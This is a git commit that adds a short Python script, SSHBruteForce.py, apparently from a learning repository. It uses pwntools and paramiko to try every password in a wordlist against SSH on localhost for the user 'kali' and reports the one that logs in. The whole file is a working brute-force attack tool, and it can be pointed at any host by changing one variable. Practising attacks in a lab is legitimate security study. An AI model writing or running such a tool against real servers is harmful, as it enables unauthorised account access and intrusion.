d42f0f9f58681e8b9d8dccc7ac5dde7bb2676ba2
Kelvin.tc.Law <73468336+KelvinLaw-jpg@users.noreply.github.com>
2025-04-24 16:06:49 +0100

    Create SSHBruteForce.py

---
+++ SSHBruteForce.py
@@ -0,0 +1,30 @@
+from pwn import *
+import paramiko
+
+
+#variables needed
+host = "127.0.0.1"
+username = "kali"
+attempts = 0
+
+#open a brute force password txt file as a list
+
+with open("myBFlist.txt", "r") as password_list:
+  #for each of those password, we want to strip the spaces to clean the passwords
+	for password in password_list:
+		password = password.strip("\n")
+    #try to brute force the login using ssh() in pwn, each bf only allow 1s, and specify it's an authentication failure from paramiko lib if the attempt didn't work
+		try:
+			print("[{}] attempting password: [{}]!".format(attempts,password))
+			response = ssh(host=host, user=username, password=password, timeout=1)
+      #check the return response, if response is connected, then print "we are in!", then close the response and break the loop
+			if response.connected():
+				print("we are in! Password: {}".format(password))
+				response.close()
+				break
+      #if the ssh() attempt didn't succeed, we also want to close the response  
+			response.close()
+		except paramiko.ssh_exception.AuthenticationException:
+			print("[X] Invalid password!")
+		attempts += 1
+
